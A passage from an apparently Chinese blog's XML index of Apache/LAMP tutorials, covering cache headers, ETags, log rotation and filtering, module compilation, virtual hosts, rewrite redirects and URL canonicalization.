    <content type="text"><![CDATA[apache 配置静态缓存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的静态文件指的是图片、js、css等文件，用户访问一个站点，其实大多数元素都是图片、js、css等，这些静态文件其实是会被客户端的浏览器缓存到本地电脑上的，目的就是为了下次再请求时不再去服务器上下载，这样就加快了速度，提高了用户体验。但这些静态文件总不能一直缓存，它总有一些时效性。 1234567891011121314[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf&lt;IfModule mod_expires.c&gt;ExpiresActive onExpiresByType image/gif "access plus 1 days"ExpiresByType image/jpeg "access plus 24 hours"ExpiresByType image/png "access plus 24 hours"ExpiresByType text/css "now plus 2 hour"ExpiresByType application/x-javascript "now plus 2 hours"ExpiresByType application/javascript "now plus 2 hours"ExpiresByType application/x-shockwave-flash "now plus 2 hours"ExpiresDefault "now plus 0 min"&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试配置是否成功，并重启apache 服务 123[root@lamp ~]# apachectl -tSyntax OK[root@lamp ~]# apachectl graceful &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用curl 测试 12345678910[root@lamp ~]# curl -x127.0.0.1:80 'http://www.test.com/static/image/common/logo.png' -IHTTP/1.1 200 OKDate: Thu, 05 Jan 2017 06:33:18 GMTServer: Apache/2.2.31 (Unix) PHP/5.6.6Last-Modified: Tue, 31 May 2016 03:08:36 GMTETag: "2854b-1149-5341ab0597500"Accept-Ranges: bytesContent-Length: 4425Cache-Control: max-age=86400Expires: Fri, 06 Jan 2017 06:33:18 GMTContent-Type: image/png &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者使用mod_headers 模块实现 1234567891011121314&lt;IfModule mod_headers.c&gt;#htm,html,txt 类的文件缓存一小时&lt;filesmatch "\.(html|htm|txt)$"&gt;header set cache-control "max-age=3600"&lt;/filesmatch&gt;#css,js,swf 类的文件缓存一个星期&lt;filesmatch "\.(cssl|js|swf)$"&gt;header set cache-control "max-age=604800"&lt;/filesmatch&gt;#jpg,gif,jpeg,png,ico,flv,pdf 类的文件缓存一年&lt;filesmatch "\.(jpg|gif|jpeg|png|ico|flv|pdf)$"&gt;header set cache-control "max-age=29030400"&lt;/filesmatch&gt;&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：这里的时间单位可以是days，hours，甚至是min，两种不同的方法，要想使用这些模块，必须要事先已经支持。查看是否支持命令： 1[root@lamp ~]# /usr/local/apache2/bin/apachectl -M]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Apache安装加载mod_headers模块]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F38.%20Linux%20Apache%E5%AE%89%E8%A3%85%E5%8A%A0%E8%BD%BDmod_headers%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[Linux Apache安装加载mod_headers模块&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mod_headers模块用于控制和修改HTTP请求头和应答头 进入到mod_headers.c目录 1cd /usr/local/src/httpd-2.2.24/modules/metadata 执行编译加载程序 1/usr/local/apache2/bin/apxs -i -a -c mod_headers.c 重新启动httpd程序 1service httpd restart 查看是否已经加载成功 1httpd -M]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是etag工作原理及配置]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F40.%20%E4%BB%80%E4%B9%88%E6%98%AFetag%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[什么是etag工作原理及配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Etag 是URL的Entity Tag，用于标示URL对象是否改变，区分不同语言和Session等等。具体内部含义是使服务器控制的，就像Cookie那样。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HTTP协议规格说明定义ETag为“被请求变量的实体值” 。另一种说法是，ETag是一个可以与Web资源关联的记号（token）。典型的Web资源可以一个Web页，但也可能是JSON或XML文档。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Etag在HTTP1.1中有介绍，主要的作用就是在(css file, image, javascript file)文件后面添加一个唯一的参数（相当于查询参数字符串），Etag有服务器端生成，并且随着文件的改变而改变，这样浏览器端就会只重新请求获取 Etag发生变化的文件，减少浏览器端数据的流量，加快浏览器的反应速度，重要的是减轻服务器端的压力，所以服务器端Etag的实现就比较重要了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在我们有个问题为什么要使用Etag呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Etag主要为了解决Last-Modified无法解决的一些问题.他能比Last_Modified更加精确的知道文件是否被修改过.如果有个 文件修改非常频繁，比如在秒以下的时间内进行修改，比如1秒内修改了10次，If-Modified-Since能检查只能秒级的修改，所以这种修改无法 判断.原因是UNIX记录MTIME只能精确到秒.所以我们选择生成Etag，因为Etag可以综合Inode，MTime和Size，可以避免这个问题. Etag的工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Etag在服务器上生成后，客户端通过If-Match或者说If-None-Match这个条件判断请求来验证资源是否修改。我们常见的是使用If-None-Match.请求一个文件的流程可能如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新的请求客户端发起HTTP GET请求一个文件(css ,image,js)；服务器处理请求，返回文件内容和一堆Header(包括Etag,例如”2e681a-6-5d044840″),http头状态码为为200.同一个用户第二次这个文件的请求 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端在一次发起HTTP GET请求一个文件，注意这个时候客户端同时发送一个If-None-Match头，这个头中会包括上次这个文件的Etag(例如”2e681a- 6-5d044840″),这时服务器判断发送过来的Etag和自己计算出来的Etag，因此If-None-Match为False，不返回200，返 回304，客户端继续使用本地缓存； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：服务器又设置了Cache-Control:max-age和Expires时,会同时使用，也就是说在完全匹配If-Modified-Since和If-None-Match即检查完修改时间和Etag之后，服务器才能返回304. 在Apache中的Etag的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Apache中设置Etag的支持比较简单，只需要在apache的配置中加入下面的内容就可以了： FileETag MTime Size 注解:FileETag指令配置了当文档是基于一个文件时用以创建ETag(实体标签)应答头的文件的属性(ETag的值用于进行缓冲管理以节约网 络带宽)。ETag的值由文件的inode(索引节点)、大小、最后修改时间决定。FileETag指令可以让您选择(如果您想进行选择)这其中 哪些要素 将被使用。主要关键字如下： INode 文件的索引节点(inode)数 MTime 文件的最后修改日期及时间 Size 文件的字节数 All 所有存在的域，等价于：FileETag INode MTime Size None 如果一个文档是基于文件的，则不在应答中包含任何ETag头 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在大型多WEB集群时,使用ETag时有问题,所以有人建议使用WEB集群时不要使用ETag,其实很好解决,因为多服务器时,INode不一样, 所以不同的服务器生成的ETag不一样,所以用户有可能重复下载(这时ETag就会不准),明白了上面的原理和设置后,解决方法也很容易,让ETag后面 二个参数,MTime和Size就好了.只要ETag的计算没有INode参于计算,就会很准了.]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 不记录指定文件类型日志]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F36.%20apache%20%E4%B8%8D%E8%AE%B0%E5%BD%95%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[apache 不记录指定文件类型日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果一个站点访问量特别大，那么访问日志就会很多。但有一些访问日志其实可以忽略掉的，比如网站的一些图片，还有 js，css 等静态对象。而这些文件的访问往往是巨量的，而且即使记录这些日志也没有什么用，如何忽略掉这些访问日志呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相关配置为： 12345678910111213141516[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf SetEnvIf Request_URI \.jpg$ image-request SetEnvIf Request_URI \.JPG$ image-request SetEnvIf Request_URI \.png$ image-request SetEnvIf Request_URI \.js$ image-request SetEnvIf Request_URI \.bmp$ image-request SetEnvIf Request_URI \.css$ image-request SetEnvIf Request_URI \.mid$ image-request SetEnvIf Request_URI \.swf$ image-request SetEnvIf Request_URI \.mmf$ image-request SetEnvIf Request_URI \.wma$ image-request SetEnvIf Request_URI \.midi$ image-request ErrorLog "|/usr/local/apache2/bin/rotatelogs -l /usr/local/apache2/logs/test.com-error_%Y%m%d_log 86400" CustomLog "|/usr/local/apache2/bin/rotatelogs -l /usr/local/apache2/logs/test.com-access_%Y%m%d_log 86400" combined env=!image-request &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：在原来日志配置的基础上，增加了一些 image-request 的定义，比如把 gif 、jpg、bpm、swf、js、css 等结尾的全标记为 image-request 。谈后在配置日志的时候加一个标记 env=!image-request ，这里有个叹号，表示取反，这样就可以把这些忽略了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 的默认编码]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F4.%20apache%20%E7%9A%84%E9%BB%98%E8%AE%A4%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[apache 的默认编码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在httpd.conf 中有一个参数是控制apache的默认编码的，AddDefaultCharset 它的作用就是当开发者没有指定程序的编码时，apache会按照这里的配置来显示效果。一般这个参数是不需要的，因为很少有程序不指定编码。为了引起不必要的麻烦，建议开启这个编码的童鞋去掉吧。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache options参数]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F20.%20apache%20options%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[apache options参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指令控制了在特定目录中将使用哪些服务器特性。Options属性有一个非常特别的功能： 如果你没有用“+”或者“-”来增加或者减少一个功能的时候，每个之前定义的Options的所有功能都会被取消， 直到你又为它指定一些功能。所以options属性在整体设置和虚拟主机设置的是不相关的， 互相不起作用，因为他们在特定的范围内被重载了。 如果要在虚拟主机里面使用在整体设置中的Options的设置， 那么就不要在虚拟主机设置中指定Options属性。如果要增加或者减少功能， 那么用“+”或者“-”符号来实 Options 指令控制了在特定目录中将使用哪些服务器特性。 可选项能设置为 None ，在这种情况下，将不启用任何额外特性。或设置为以下选项中的一个或多个： All 除MultiViews之外的所有特性。这是默认设置。 ExecCGI 允许执行CGI脚本. FollowSymLinks 服务器会在此目录中使用符号连接。 注意：即便服务器会使用符号连接，但它不会改变用于匹配配置段的路径名。 如果此配置位于配置段中，则此设置会被忽略。 Includes 允许服务器端包含。 IncludesNOEXEC 允许服务器端包含，但禁用#exec命令和#exec CGI。但仍可以从 ScriptAliase目录使用#include 虚拟CGI脚本。 Indexes 如果一个映射到目录的URL被请求，而此目录中又没有DirectoryIndex（例如：index.html），那么服务器会返回一个格式化后的目录 列表。 MultiViews 允许内容协商的多重视图。 SymLinksIfOwnerMatch 服务器仅在符号连接与其目的目录或文件拥有者具有同样的用户id时才使用它。 注意：如果此配置出现在配置段中，此选项将被忽略。 一般来说，如果一个目录被多次设置了 Options ，则最特殊的一个会被完全接受，而各个可选项的设定彼此并不融合。然而，如果所有施用于 Options 指令的可选项前都加有+或-符号，此可选项将被合并。所有前面加有+号的可选项将强制覆盖当前可选项设置，而所有前面有-号的可选项将强制从当前可选项设置中去除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如说，没有任何+和-符号： 123Options Indexes FollowSymLinks Options Includes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;则只有 Includes 设置到/web/docs/spec目录上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而如果第二个 Options 指令使用了+和-符号： 123Options Indexes FollowSymLinks Options +Includes -Indexes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么就会有 FollowSymLinks 和 Includes 设置到/web/docs/spec目录上。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 日志切割]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F29.%20apache%20%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%2F</url>
    <content type="text"><![CDATA[apache 日志切割&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的日志指的是访问日志，没访问一次网站，就会记录若干条日志。前提是已经配置了日志，日志如果不去管理，时间长了日志文件会越来越大，这个时候这个日志是不可能 cat、less、 以及 vim 的，head 或 tail 还可以。如何避免产生这么大的日志文件？其实 apache 有相关配置，是日志按照我们的需求进行归档，比如每天一个新日志，或者每小时一个新日志。 1[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在对应的虚拟主机配置文件中加入 12ErrorLog "|/usr/local/apache2/bin/rotatelogs -l /usr/local/apache2/logs/test.com-error_%Y%m%d_log 86400"CustomLog "|/usr/local/apache2/bin/rotatelogs -l /usr/local/apache2/logs/test.com-access_%Y%m%d_log 86400" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：ErrorLog 是错误日志，CustomLog 是访问日志。最前面的竖线是管道符，意思是把产生的日志交给 rotatelogs 这个工具，而这个工具就是 apache 自带的切割日志的工具。 -l 的作用是校准时区为UTC ，也就是北京时间。最后的86400，单位是秒，正好是一天，那么日志会每天切割一次。最后面的 combined 问日志格式，关于日志格式在 1[root@lamp ~]# vim /usr/local/apache2/conf/httpd.conf 1234[root@lamp ~]# grep LogFormat /usr/local/apache2/conf/httpd.conf LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\"" combined LogFormat "%h %l %u %t \"%r\" %&gt;s %b" common LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\" %I %O" combinedio]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache mod_proxy 扩展模块安装]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F11.%20apache%20mod_proxy%20%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[apache mod_proxy 扩展模块安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在用到apache的扩展功能了，可是在第一次编译的时候，没有编译进这个模块去？怎么办呢，可以通过扩展的方式编译一下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载相同版本的apache源代码，注意，一定是要相同版本的，否则编译不能成功。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载后，解压 12cd httpd-2.0.59/modules/proxy/usr/local/apache2/bin/apxs -c -i -a mod_proxy.c proxy_connect.c proxy_http.c proxy_util.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从输出里面看到apache的modules目录下已经产生了mod_proxy.so,且已经在httpd.conf中激活了 12cd /usr/local/apache2/conf/ls ../modules/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看到确实有mod_prxoy.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑配置文件 1vim httpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加载模块 12LoadModule proxy_module modules/mod_proxy.so (这句是编译激活时产生的)LoadModule proxy_http_module modules/mod_proxy.so (这句是要手动添加的) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到这里proxy模块的支持算是已经完成了，下面就该配置虚拟主机了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache默认虚拟主机]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F24.%20Apache%E9%BB%98%E8%AE%A4%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[Apache默认虚拟主机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了防止其他不是自己的域名解析到自己的IP,我们可以通过更改虚拟主机文件限制其他域名。我们创建的新的虚拟主机，创建一个新的空目录将其权限设置为600。这样只有我们在配置文件中定义的域名在能访问。命令如下： 1[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把下面的配置： 12345678&lt;VirtualHost *:80&gt; ServerAdmin webmaster@dummy-host.example.com DocumentRoot "/usr/local/apache2/docs/dummy-host.example.com" ServerName dummy-host.example.com ServerAlias www.dummy-host.example.com ErrorLog "logs/dummy-host.example.com-error_log" CustomLog "logs/dummy-host.example.com-access_log" common&lt;/VirtualHost&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 12345678&lt;VirtualHost *:80&gt; DocumentRoot "/tmp/tmp" ServerName tmp.com &lt;Directory /tmp/tmp/&gt; Order allow,deny Deny from all &lt;/Directory&gt; &lt;/VirtualHost&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以直接设置成第一个虚拟主机配置文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建配置中提到的目录，并设置权限 600 12[root@lamp ~]# mkdir /tmp/tmp[root@lamp ~]# chmod 600 /tmp/tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测配置文件，重启 apache 服务 123[root@lamp ~]# apachectl -tSyntax OK[root@lamp ~]# apachectl restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实这个默认虚拟主机就是配置文件里的第一个虚拟主机。关于默认虚拟主机有个特点，凡是解析到这台机器的域名，不管是什么域名，只要在配置文件中没有配置，那么都会访问到这个主机上来。为了避免别人乱解析，应该把默认也就是第一个虚拟主机给禁止掉。这里使用了 allow，deny 语句，已经禁止掉了。现在用 ip 或其他域名去访问，已经提示： apache nameserver 两个如何设置1234ServerName sub1.domain.comServerAlias sub2.domain.comDocumentRoot /var/www/sub/# other settings apache 代理模块 proxy应用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要使用proxy功能，首先编译apache的时候，需要加上参数 ·–enable-proxy –enable-proxy-http· &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果，不想重新编译，也可以以扩展的形式安装proxy模块，具体请参考 apache mod_proxy 扩展模块安装 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体配置为： 123456789ServerName www.test.comCustomLog "/dev/null" combinedProxyRequests Off Order deny,allow Allow from all ProxyPass / http://www.test.com/ProxyPassReverse / 192.168.13.111/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外需要注意的是，需要在/etc/hosts 中加一条记录 1192.168.13.111 www.test.com apache某个虚拟主机不启用gzip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认情况下，如果apache中调用了mod_deflate ，那么所有虚拟主机都会启用gzip压缩功能。但有时候会遇到某个虚拟主机不想启用gzip的应用，这如何设置呢？只要在该虚拟主机中加入一下代码即可。 1SetOutputFilter DEFLATE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的 /data/web/example 为该虚拟主机的主目录。 apache配置多个域名指向的虚拟主机访问总是指向第一个虚拟主机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在配置apache多个虚拟主机的时候，访问总是指向第一个虚拟主机,加上 NameVirtualHost * :80后解决问题. 12345678&lt;VirtualHost *:80&gt; DocumentRoot "F:/web" ServerName localhost&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; DocumentRoot "F:/web/aa/" ServerName *.test.com&lt;/VirtualHost&gt; 针对apache的虚拟主机开启php短标签&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php.ini中 1short_open_tag = On &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除&lt;?php ?&gt;，可使用更灵活的调用方法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&lt;? /程序操作/ ?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&lt;?=/函数/?&gt;]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 的域名重定向]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F28.%20apache%20%E7%9A%84%E5%9F%9F%E5%90%8D%E9%87%8D%E5%AE%9A%E5%90%91%2F</url>
    <content type="text"><![CDATA[apache 的域名重定向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求：要把访问域名 www.domain1.com 的域名转发到 www.domain2.com 上 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在相关的虚拟主机中增加 123RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^www.domain1.com$RewriteRule ^(.*)$ http://www.domain2.com/$1 [R=301,L] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是多个域名重定向到一个域名 1234RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^www.domain.com [OR]RewriteCond %&#123;HTTP_HOST&#125; ^www.domain1.com$RewriteRule ^(.*)$ http://www.domain2.com/$1 [R=301,L]]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 的动态和静态]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F12.%20apache%20%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C%E9%9D%99%E6%80%81%2F</url>
    <content type="text"><![CDATA[apache 的动态和静态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于apache的动态与静态编译的理解，引用某人的比喻如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好比有两个人a和m，a代表apache,m代表module，要想让a使用m的东西，一个方法是把m的东西都放到a那里去，a使用的时候就是现成的了，就是所谓的静态编译 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一个方法，就是告诉a，m的住址，当a要使用m的东西的时候,a去找m,然后使用，不过，这种方法要注意的一个问题就是：m必须要有实际的住址，否则a会找不到m而产生错误的，这种方法也就是apache 的动态(DSO)编译了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面说说在apache1.3和apache2.0动态与静态编译编译的区别 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先是apache1.3.29+php4.3.4+mysql4.0.13的静态编译 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache第一次编译,并不要安装，因为php的编译需要apache至少已经编译过一次 123tar zvxf apache_1.3.27.tar.gz cd apache_1.3.27 ./configure --prefix=/usr/local/apache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译php 1234567tar zvxf php4.3.4.tar.gz cd php4.3.4./configure --prefix=/usr/local/php \--with-mysql=/usr/local/mysql \--with-apache=../apache_1.3.27 makemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二次编译安装apache: 123456cd ../apache_1.3.29./configure --prefi=/usr/local/apache \--activate-module=src/modules/php4/libphp4.a make make installcp ../php4.3.4/php.ini.dist /usr/local/php/lib/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改/usr/local/apache/conf/httpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在此范围添加 12AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：apache和php的源码包在同一个目录，–with-apache=../apache_1.3.27是指向源码解压的目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ok!静态编译完成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再看DSO动态编译方法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先编译安装apache 12345678tar zvxf apache_1.3.29cd apache_1.3.29./configure --prefix=/usr/local/apache \--enable-module=so \--enable-module=rewrite \--enable-shared=maxmake make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;so模块用来提供DSO支持的apachehe核心模块，rewrite是地址重写的模块，如果不需要可以不编译enable－shared＝max是指除了so以外的所有标准模块都编译成DSO模块。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编译php 1234567tar zvxf php4.3.4.tar.gz cd php4.3.2 ./configure --prefix=/usr/local/php \--with-mysql=/usr/local/mysql \--with-apxs=/usr/local/apache/bin/apxs makemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改httpd.conf，方法同静态编译的方法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;OK，DSO动态编译就完成了！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来我们讲apache2.0.46+php4.3.2的动态编译方法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一样先编译安装apache 1234567tar zvxf httpd-2.0.46.tar.gzcd httpd-2.0.46./configure --prefix=/usr/local/apache2 \--enable-so \--enable-mods-shared=mostmakemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大家注意了–enable-so相当与1.3.27的–enable-module=so，而–enable-mods-shared=most又等同与以前的–enable-shared=max &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后还是编译PHP 123456tar zvxf php4.3.2.tar.gz./configure --prefix=/usr/local/php \--with-mysql=/usr/local/mysql \--with-apxs2=/usr/local/apache2/bin/apxs make make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意这里是apxs2！！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改httpd.conf与1.3.27也有所不同，大家寻找Add Type application/x-tar .tgz 在下面添加 12AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外要显示中文的话，请修改: 1AddDefaultCharset gb2312]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URL网址规范化]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F27.%20URL%E7%BD%91%E5%9D%80%E8%A7%84%E8%8C%83%E5%8C%96%2F</url>
    <content type="text"><![CDATA[URL网址规范化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网址URL规范化（URL canonicalization）是近一年来在Google搜索结果中出现的一个很大的问题。它指的是搜索引擎挑选最好的URL网址作为真正网址的过程。举例来说，下面这几个URL一般来说指的是同一个文件或网页： http://www.domainname.com http://domainname.com http://www.domainname.com/index.html http://domainname.com/index.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是从技术上来讲，这几个URL网址都是不同的。虽然在绝大部分情况下，这些网址所返回的都是相同的文件，也就是你的主页。但是从技术上来说，主机完全可以对这几个网址返回不同的内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当搜索引擎要规范化网址时，搜索引擎需要从这些选择当中挑一个最好的代表。一般来说，你的主页应该是固定的，只有一个。但是有的时候，在很多网站上站长在链接回主页时，所使用的URL并不是唯一的。很可能在你的网站上，一会连到URL http://www.domainname.com，一会儿连到URL http://www.domainname.com/index.html 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然这不会给访客造成什么麻烦，因为这些网址都是同一个文件，但是对Google来说却是造成了困惑，哪一个网址是你真正的主页呢？如果在你的网站上，不同的版本网址都大量出现，那么这两个URL可能都会被Google收录进数据库，这时就会造成复制内容网页。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所谓复制内容网页，指的是两个或多个网页的内容是相同或大部分相似的。很多时候，复制网页有可能是作弊手段。就算不是作弊手段的时候，搜索引擎通常也只会挑出其中一个返回搜索结果，而把其他的复制网页都排在最后面，以至于根本找不到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你的网站出现网址URL规范化问题的时候，就有可能造成被怀疑为复制网页，因而影响搜索引擎结果排名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从Google的角度来说，他们正在发展所谓大爸爸数据中心基本架构，来解决包括URL规范化的问题。但谁知道能不能解决呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从站长的角度来考虑，你应该做两件事： 你的网站内部在链接到其他网页，尤其是主页时，只使用一种URL。不管是包含www或不包含www，你要由始至终只使用一个版本。这样搜索引擎也就明白哪一个是规范化的主页网址。 但是你没办法控制别的网站用哪一个网址连向你的主页。所以你应该在你的主机服务器上，把所有有可能成为主页网址的URL，做301重定向到你所选择的主页网址版本。也就是说，从下面这几个网址 http://domainname.com http://www.domainname.com/index.html http://domainname.com/index.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;都要做301重定向到这个网址 http://www.domainname.com 